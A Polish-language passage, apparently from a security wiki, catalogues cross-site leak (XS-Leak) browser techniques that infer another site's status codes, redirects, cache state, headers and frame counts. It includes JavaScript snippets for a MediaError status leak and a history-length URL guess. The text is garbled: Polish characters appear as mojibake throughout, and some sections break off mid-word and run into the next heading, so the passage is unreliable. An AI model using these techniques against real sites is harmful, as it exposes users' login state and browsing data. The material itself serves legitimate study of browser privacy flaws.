Mo偶liwe jest **rozr贸偶nienie midzy kodami stanu odpowiedzi HTTP**, poniewa偶 偶dania, kt贸re prowadz do **bdu**, nie tworz wpisu dotyczcego wydajnoci.

### Bd ponownego adowania stylu

* **Metody wczenia**: Elementy HTML
* **Wykrywalna r贸偶nica**: Kod stanu
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Podsumowanie:** Ze wzgldu na bd przegldarki, 偶dania, kt贸re kocz si bdem, s adowane dwukrotnie.
* **Przykad kodu**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

W poprzedniej technice zidentyfikowano r贸wnie偶 dwa przypadki, w kt贸rych bdy przegldarki w GC powoduj **adowanie zasob贸w dwukrotnie, gdy nie s w stanie si zaadowa**. Powoduje to wielokrotne wpisy w API Performance i mo偶e by wykryte.

### Bd scalania 偶da

* **Metody wczenia**: Elementy HTML
* **Wykrywalna r贸偶nica**: Kod stanu
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Podsumowanie:** 呕dania, kt贸re kocz si bdem, nie mog by scalane.
* **Przykad kodu**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Technika zostaa znaleziona w tabeli w wymienionym dokumencie, ale nie znaleziono na niej opisu techniki. Jednak kod 藕r贸dowy sprawdzajcy to mo偶na znale藕 pod adresem [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Wyciek pustej strony

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Podsumowanie:** Puste odpowiedzi nie tworz wpis贸w dotyczcych czasu zasobu.
* **Przykad kodu**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Atakujcy mo偶e wykry, czy 偶danie zakoczyo si pustym ciaem odpowiedzi HTTP, poniewa偶 **puste strony nie tworz wpisu dotyczcego wydajnoci** w niekt贸rych przegldarkach.

### Wyciek XSS-Auditor

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Podsumowanie:** Korzystajc z XSS Auditor w Security Assertions, atakujcy mo偶e wykry okrelone elementy strony internetowej, obserwujc zmiany w odpowiedziach, gdy skonstruowane adunki wywouj mechanizm filtrowania auditora.
* **Przykad kodu**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

W Security Assertions (SA), XSS Auditor, pierwotnie przeznaczony do zapobiegania atakom typu Cross-Site Scripting (XSS), paradoksalnie mo偶e by wykorzystany do wycieku poufnych informacji. Chocia偶 ta wbudowana funkcja zostaa usunita z przegldarki Google Chrome (GC), wci偶 jest obecna w SA. W 2013 roku Braun i Heiderich wykazali, 偶e XSS Auditor mo偶e przypadkowo blokowa prawidowe skrypty, co prowadzi do faszywych pozytyw贸w. Na tej podstawie badacze opracowali techniki wydobywania informacji i wykrywania okrelonej zawartoci na stronach o r贸偶nym pochodzeniu, koncepcj znan jako XS-Leaks, pocztkowo zgoszon przez Terad i rozwinit przez Heyesa w wpisie na blogu. Chocia偶 te techniki dotyczyy tylko XSS Auditora w GC, odkryto, 偶e w SA strony blokowane przez XSS Auditora nie generuj wpis贸w w API Performance, ujawniajc metod wycieku poufnych informacji.

### Wyciek X-Frame

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Nag贸wek
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Podsumowanie:** Zas贸b z nag贸wkiem X-Frame-Options nie tworzy wpisu dotyczcego czasu zasobu.
* **Przykad kodu**:
### Wyciek przekierowania pocztkowego

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Przekierowanie
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Podsumowanie**: Wyciek wpisu dotyczcego czasu rozpoczcia przekierowania.
* **Przykad kodu**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Znale藕limy jedno wystpienie XS-Leak, kt贸re wykorzystuje zachowanie niekt贸rych przegldarek, kt贸re rejestruj zbyt wiele informacji dotyczcych 偶da midzydomenowych. Standard definiuje podzbi贸r atrybut贸w, kt贸re powinny by ustawione na zero dla zasob贸w midzydomenowych. Jednak w **SA** mo偶liwe jest wykrycie, czy u偶ytkownik jest **przekierowany** przez stron docelow, poprzez zapytanie **Performance API** i sprawdzenie danych czasowych **redirectStart**.

### Wyciek czasu trwania przekierowania

* **Metody wczenia**: Fetch API
* **Wykrywalna r贸偶nica**: Przekierowanie
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Podsumowanie**: Czas trwania wpis贸w czasowych jest ujemny, gdy wystpuje przekierowanie.
* **Przykad kodu**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

W GC, **czas trwania** dla 偶da, kt贸re skutkuj **przekierowaniem**, jest **ujemny** i mo偶na go zatem **rozr贸偶ni** od 偶da, kt贸re nie skutkuj przekierowaniem.

### Wyciek CORP

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Nag贸wek
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Podsumowanie**: Zasoby chronione za pomoc CORP nie tworz wpis贸w dotyczcych czasu zasobu.
* **Przykad kodu**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

W niekt贸rych przypadkach mo偶na u偶y wpisu **nextHopProtocol** jako techniki wycieku. W GC, gdy ustawiony jest nag贸wek **CORP**, nextHopProtocol bdzie **pusty**. Nale偶y zauwa偶y, 偶e SA w og贸le nie tworzy wpisu wydajnociowego dla zasob贸w z wczonym CORP.

### Pracownik usugi

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: U偶ycie interfejsu API
* **Wicej informacji**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Podsumowanie**: Wykrywanie, czy pracownik usugi jest zarejestrowany dla okrelonego 藕r贸da.
* **Przykad kodu**:

Pracownicy usugi s kontekstami skryptowymi sterowanymi zdarzeniami, kt贸re dziaaj w okrelonym 藕r贸dle. Pracuj w tle strony internetowej i mog przechwytywa, modyfikowa i **buforowa zasoby**, aby tworzy aplikacje internetowe offline.\
Jeli **zas贸b buforowany** przez pracownika usugi jest dostpny za porednictwem **ramki**, zas贸b zostanie **zaadowany z bufora pracownika usugi**.\
Aby sprawdzi, czy zas贸b zosta **zaadowany z bufora pracownika usugi**, mo偶na u偶y **Performance API**.\
Mo偶na to r贸wnie偶 zrobi za pomoc ataku czasowego (sprawd藕 dokument, aby uzyska wicej informacji).

### Pami podrczna

* **Metody wczenia**: Fetch API
* **Wykrywalna r贸偶nica**: Czasowanie
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Podsumowanie**: Mo偶liwe jest sprawdzenie, czy zas贸b zosta przechowywany w pamici podrcznej.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Za pomoc [Performance API](xs-search.md#performance-api) mo偶na sprawdzi, czy zas贸b jest buforowany.

### Czas trwania sieci

* **Metody wczenia**: Fetch API
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Podsumowanie**: Mo偶liwe jest pobranie czasu trwania sieciowego 偶dania z API `performance`.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Technika komunikat贸w o bdach

### Bd multimedi贸w

* **Metody wczenia**: Elementy HTML (Wideo, Audio)
* **Wykrywalna r贸偶nica**: Kod stanu
* **Wicej informacji**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Podsumowanie**: W przegldarce Firefox mo偶liwe jest dokadne wyciekanie kodu stanu 偶dania midzydomenowego.
* **Przykad kodu**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
Interfejs `MediaError` posiada waciwo `message`, kt贸ra jednoznacznie identyfikuje zasoby, kt贸re s poprawnie adowane za pomoc unikalnego cigu znak贸w. Atakujcy mo偶e wykorzysta t funkcj, obserwujc zawarto wiadomoci, co pozwala wywnioskowa status odpowiedzi zasobu z innej domeny.

### Bd CORS

* **Metody wczenia**: Fetch API
* **Wykrywalna r贸偶nica**: Nag贸wek
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Podsumowanie**: W przypadku twierdze dotyczcych bezpieczestwa (SA), komunikaty o bdach CORS nieumylnie ujawniaj peny adres URL przekierowanych 偶da.
* **Przykad kodu**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Ta technika umo偶liwia atakujcemu **wydobycie celu przekierowania strony z innej domeny** poprzez wykorzystanie sposobu, w jaki przegldarki oparte na Webkit obsuguj 偶dania CORS. Konkretnie, gdy **偶danie z wczonym CORS** jest wysyane do docelowej strony, kt贸ra przekierowuje na podstawie stanu u偶ytkownika, a nastpnie przegldarka odrzuca 偶danie, w komunikacie o bdzie ujawniany jest **peny adres URL docelowego przekierowania**. Ta podatno nie tylko ujawnia fakt przekierowania, ale tak偶e eksponuje punkt kocowy przekierowania i ewentualne **wra偶liwe parametry zapytania**, kt贸re mo偶e zawiera.

### Bd SRI

* **Metody wczenia**: Fetch API
* **Wykrywalna r贸偶nica**: Nag贸wek
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Podsumowanie**: W przypadku twierdze dotyczcych bezpieczestwa (SA), komunikaty o bdach CORS nieumylnie ujawniaj peny adres URL przekierowanych 偶da.
* **Przykad kodu**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Atakujcy mo偶e wykorzysta **rozszerzone komunikaty o bdach**, aby wywnioskowa rozmiar odpowiedzi zasob贸w z innej domeny. Jest to mo偶liwe dziki mechanizmowi Integralnoci Podzasob贸w (SRI), kt贸ry u偶ywa atrybutu integralnoci do sprawdzania, czy zasoby pobierane, czsto z CDN-贸w, nie zostay zmodyfikowane. Aby SRI dziaao na zasobach z innej domeny, musz by **wczone CORS**; w przeciwnym razie nie podlegaj one sprawdzaniu integralnoci. W przypadku twierdze dotyczcych bezpieczestwa (SA), podobnie jak w przypadku bdu CORS XS-Leak, mo偶na przechwyci komunikat o bdzie po nieudanym 偶daniu fetch z atrybutem integralnoci. Atakujcy mo偶e celowo **wywoa ten bd**, przypisujc **faszyw warto skr贸tu** do atrybutu integralnoci dowolnego 偶dania. W przypadku twierdze dotyczcych bezpieczestwa (SA), wynikajcy z tego komunikat o bdzie nieumylnie ujawnia dugo zawartoci 偶danego zasobu. Wyciek tej informacji pozwala atakujcemu rozpozna r贸偶nice w rozmiarze odpowiedzi, otwierajc drog do zaawansowanych atak贸w XS-Leak.

### Naruszenie/odkrycie CSP

* **Metody wczenia**: Wyskakujce okna
* **Wykrywalna r贸偶nica**: Kod statusu
* **Wicej informacji**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Podsumowanie**: Jeli w CSP dozwolona jest tylko strona ofiary, a pr贸buje ona przekierowa na inn domen, CSP spowoduje wykrywalny bd.
* **Przykad kodu**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

XS-Leak mo偶e wykorzysta CSP do wykrycia, czy strona z innej domeny zostaa przekierowana na inn domen. Wyciek ten mo偶e wykry przekierowanie, ale dodatkowo ujawnia domen docelow przekierowania. Podstawow ide tego ataku jest **dozwolenie na domen docelow na stronie atakujcego**. Po wysaniu 偶dania do domeny docelowej, nastpuje przekierowanie na domen z innej domeny. **CSP blokuje** dostp do niej i tworzy **raport naruszenia u偶ywany jako technika wycieku**. W zale偶noci od przegldarki, **ten raport mo偶e ujawni lokalizacj docelow przekierowania**.\
Nowoczesne przegldarki nie wska偶 adresu URL, na kt贸ry nastpio przekierowanie, ale wci偶 mo偶na wykry, 偶e zostao ono uruchomione.

### Pami podrczna

* **Metody wczenia**: Ramki, Wyskakujce okna
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Podsumowanie**: Wyczy plik z pamici podrcznej. Otw贸rz stron docelow i sprawd藕, czy plik jest obecny w pamici podrcznej.
* **Przykad kodu:**

Przegldarki mog u偶ywa jednej wsp贸lnej pamici podrcznej dla wszystkich witryn. Bez wzgldu na ich pochodzenie, mo偶na wywnioskowa, czy strona docelowa **偶daa okrelonego pliku**.

Jeli strona adowana jest obrazem tylko wtedy, gdy u偶ytkownik jest zalogowany, mo偶na **uniewa偶ni** ten **zas贸b** (aby nie by ju偶 w pamici podrcznej, jeli by, zobacz wicej informacji w linkach), **wykona 偶danie**, kt贸re mogoby zaadowa ten zas贸b i spr贸bowa zaadowa zas贸b **za pomoc bdnego 偶dania** (np. u偶ywajc zbyt dugiego nag贸wka referer). Jeli adowanie zasobu **nie spowodowao 偶adnego bdu**, oznacza to, 偶e jest on **w pamici podrcznej**.

### Dyrektywa CSP

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Nag贸wek
* **Wicej informacji**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Podsumowanie**: Dyrektywy nag贸wka CSP mog by sondowane za pomoc atrybutu iframe CSP, ujawniajc szczeg
### CORB

* **Metody wczenia**: Elementy HTML
* **Wykrywalna r贸偶nica**: Nag贸wki
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Podsumowanie**: CORB mo偶e umo偶liwi atakujcym wykrycie obecnoci nag贸wka **`nosniff`** w 偶daniu.
* **Przykad kodu**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Sprawd藕 link, aby uzyska wicej informacji na temat ataku.

### Bd CORS na skutek bdu konfiguracji odbicia pochodzenia <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Metody wczenia**: Fetch API
* **Wykrywalna r贸偶nica**: Nag贸wki
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Podsumowanie**: Jeli nag贸wek Origin jest odbijany w nag贸wku `Access-Control-Allow-Origin`, mo偶liwe jest sprawdzenie, czy zas贸b jest ju偶 w pamici podrcznej.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Jeli nag贸wek Origin jest odbijany w nag贸wku `Access-Control-Allow-Origin`, atakujcy mo偶e wykorzysta to zachowanie, aby spr贸bowa pobra zas贸b w trybie CORS. Jeli nie zostanie wywoany bd, oznacza to, 偶e zas贸b zosta poprawnie pobrany z sieci, jeli zostanie wywoany bd, oznacza to, 偶e zosta pobrany z pamici podrcznej (bd pojawia si, poniewa偶 pami podrczna zapisuje odpowied藕 z nag贸wkiem CORS, kt贸ry zezwala na oryginaln domen, a nie na domen atakujcego).\
Nale偶y zauwa偶y, 偶e jeli nie jest odbijany pochodzenie, ale u偶ywany jest znak wieloznaczny (`Access-Control-Allow-Origin: *`), to nie zadziaa.

## Technika odczytu atrybut贸w

### Przekierowanie Fetch

* **Metody wczenia**: Fetch API
* **Wykrywalna r贸偶nica**: Kod stanu
* **Wicej informacji**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Podsumowanie**: GC i SA pozwalaj sprawdzi typ odpowiedzi (opaque-redirect) po zakoczeniu przekierowania.
* **Przykad kodu**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Przesyajc 偶danie za pomoc Fetch API z parametrem `redirect: "manual"` i innymi parametrami, mo偶liwe jest odczytanie atrybutu `response.type`, a jeli jest r贸wny `opaqueredirect`, oznacza to, 偶e odpowied藕 bya przekierowaniem.

### COOP

* **Metody wczenia**: Wyskakujce okna
* **Wykrywalna r贸偶nica**: Nag贸wek
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Podsumowanie**: Strony zabezpieczone przez Cross-Origin Opener Policy (COOP) uniemo偶liwiaj dostp do interakcji midzy pochodzeniami.
* **Przykad kodu**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Atakujcy jest w stanie wywnioskowa obecno nag贸wka Cross-Origin Opener Policy (COOP) w odpowiedzi HTTP z innego pochodzenia. COOP jest wykorzystywane przez aplikacje internetowe do uniemo偶liwienia zewntrznym witrynom uzyskiwania dowolnych odwoa do okien. Obecno tego nag贸wka mo偶na zauwa偶y, pr贸bujc uzyska dostp do odwoania **`contentWindow`**. W przypadkach, gdy COOP jest stosowane warunkowo, waciwo **`opener`** staje si wska藕nikiem: jest **niezdefiniowana**, gdy COOP jest aktywne, a **zdefiniowana**, gdy jest nieaktywne.

### Maksymalna dugo adresu URL - po stronie serwera

* **Metody wczenia**: Fetch API, Elementy HTML
* **Wykrywalna r贸偶nica**: Kod stanu / Zawarto
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Podsumowanie**: Wykrywanie r贸偶nic w odpowiedziach z powodu przekroczenia maksymalnej dugoci odpowiedzi przekierowania, co mo偶e spowodowa bd serwera i wygenerowanie alertu.
* **Przykad kodu**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Jeli przekierowanie po stronie serwera u偶ywa **danych u偶ytkownika wewntrz przekierowania** i **dodatkowych danych**, mo偶liwe jest wykrycie tego zachowania, poniewa偶 serwery zwykle maj **limit dugoci 偶dania**. Jeli **dane u偶ytkownika** maj **t sam dugo - 1**, poniewa偶 **przekierowanie** u偶ywa **tych danych** i **dodaje** co **dodatkowego**, spowoduje to **bd wykrywalny za pomoc zdarze bd贸w**.

Jeli somehow uda ci si ustawi ciasteczka dla u偶ytkownika, mo偶esz r贸wnie偶 przeprowadzi ten atak, **ustawiajc wystarczajc ilo ciasteczek** ([**cookie bomb**](hacking-with-cookies/cookie-bomb.md)), aby zwikszy **rozmiar odpowiedzi** poprawnej odpowiedzi i spowodowa bd. W tym przypadku pamitaj, 偶e jeli wywoasz to 偶danie z tej samej witryny, `<script>` automatycznie wyle ciasteczka (wic mo偶esz sprawdzi bdy).\
Przykad **cookie bomb + XS-Search** mo偶na znale藕 w zamierzonym rozwizaniu tego rozwizania: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

Zazwyczaj dla tego rodzaju ataku wymagane jest ustawienie `SameSite=None` lub bycie w tym samym kontekcie.

### Maksymalna dugo adresu URL - po stronie klienta

* **Metody wczenia**: Wyskakujce okna
* **Wykrywalna r贸偶nica**: Kod stanu / Zawarto
* **Wicej informacji**: [https://ctf.zeyu2001.com/2023/h
### Maksymalna liczba przekierowa

* **Metody wczenia**: Fetch API, Ramki
* **Wykrywalna r贸偶nica**: Kod statusu
* **Wicej informacji**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Podsumowanie:** U偶yj limitu przekierowa przegldarki, aby stwierdzi wystpowanie przekierowa URL.
* **Przykad kodu**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Jeli **maksymalna** liczba **przekierowa** przegldarki wynosi **20**, atakujcy mo偶e spr贸bowa zaadowa swoj stron z **19 przekierowaniami** i ostatecznie **przekierowa ofiar** na testowan stron. Jeli zostanie wywoany **bd**, oznacza to, 偶e strona pr贸bowaa **przekierowa ofiar**.

### Dugo historii

* **Metody wczenia**: Ramki, Wyskakujce okna
* **Wykrywalna r贸偶nica**: Przekierowania
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Podsumowanie:** Kod JavaScript manipuluje histori przegldarki i mo偶na go uzyska za pomoc waciwoci length.
* **Przykad kodu**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

API Historii umo偶liwia kodowi JavaScript manipulowanie histori przegldarki, kt贸ra **zapisuje odwiedzone przez u偶ytkownika strony**. Atakujcy mo偶e u偶y waciwoci length jako metody wczenia: do wykrywania nawigacji JavaScript i HTML.\
Sprawdzanie `history.length`, sprawienie, 偶e u偶ytkownik **przechodzi** do strony, **zmiana** jej **z powrotem** do tego samego pochodzenia i **sprawdzenie** nowej wartoci **`history.length`**.

### Dugo historii dla tego samego URL

* **Metody wczenia**: Ramki, Wyskakujce okna
* **Wykrywalna r贸偶nica**: Jeli URL jest taki sam jak zgadywany
* **Podsumowanie:** Mo偶liwe jest zgadnicie, czy lokalizacja ramki/wyskakujcego okna znajduje si w okrelonym URL, wykorzystujc dugo historii.
* **Przykad kodu**: Poni偶ej

Atakujcy mo偶e u偶y kodu JavaScript do **manipulowania lokalizacj ramki/wyskakujcego okna na zgadywany URL** i **natychmiast** **zmieni go na `about:blank`**. Jeli dugo historii wzronie, oznacza to, 偶e URL by poprawny i mia czas na **zwikszenie si, poniewa偶 URL nie jest ponownie adowany, jeli jest taki sam**. Jeli nie wzronie, oznacza to, 偶e **pr贸bowa zaadowa zgadywany URL**, ale poniewa偶 **natychmiast** zaadowalimy **`about:blank`**, **dugo historii nigdy nie wzrosa** podczas adowania zgadywanego URL.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Liczenie ramek

* **Metody wczenia**: Ramki, wyskakujce okienka
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Podsumowanie**: Oce ilo element贸w iframe, sprawdzajc waciwo `window.length`.
* **Przykad kodu**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Liczenie **liczby ramek** na stronie internetowej otwartej za pomoc `iframe` lub `window.open` mo偶e pom贸c zidentyfikowa **status u偶ytkownika na tej stronie**.\
Ponadto, jeli strona zawsze ma t sam liczb ramek, cige sprawdzanie liczby ramek mo偶e pom贸c w identyfikacji **wzorca**, kt贸ry mo偶e wycieka informacje.

Przykadem tej techniki jest to, 偶e w przegldarce Chrome **PDF** mo偶e by **wykrywane** za pomoc **liczenia ramek**, poniewa偶 wewntrznie u偶ywany jest element `embed`. Istniej [Parametry otwierania URL](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113), kt贸re pozwalaj na pewn kontrol nad zawartoci, tak jak `zoom`, `view`, `page`, `toolbar`, gdzie ta technika mo偶e by interesujca.

### HTMLElementy

* **Metody wczenia**: Elementy HTML
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Podsumowanie**: Odczytaj wyciek warto, aby rozr贸偶ni midzy dwoma mo偶liwymi stanami
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Wyciek informacji za pomoc element贸w HTML jest problemem w zabezpieczeniach stron internetowych, zwaszcza gdy dynamiczne pliki multimedialne s generowane na podstawie informacji u偶ytkownika lub gdy dodawane s znaki wodne, zmieniajce rozmiar medi贸w. Atakujcy mog wykorzysta to do rozr贸偶nienia midzy mo偶liwymi stanami, analizujc informacje ujawniane przez okrelone elementy HTML.

### Informacje ujawniane przez elementy HTML

- **HTMLMediaElement**: Ten element ujawnia `duration` i `buffered` medi贸w, do kt贸rych mo偶na uzyska dostp za pomoc jego API.
[Czytaj wicej o HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: Ujawnia `videoHeight` i `videoWidth`. W niekt贸rych przegldarkach dostpne s dodatkowe waciwoci, takie jak `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` i `webkitDecodedFrameCount`, kt贸re oferuj bardziej szczeg贸owe informacje na temat zawartoci multimedialnej.
[Czytaj wicej o HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Ta funkcja dostarcza szczeg贸owe informacje na temat jakoci odtwarzania wideo, w tym `totalVideoFrames`, kt贸re mo偶e wskazywa ilo przetworzonych danych wideo.
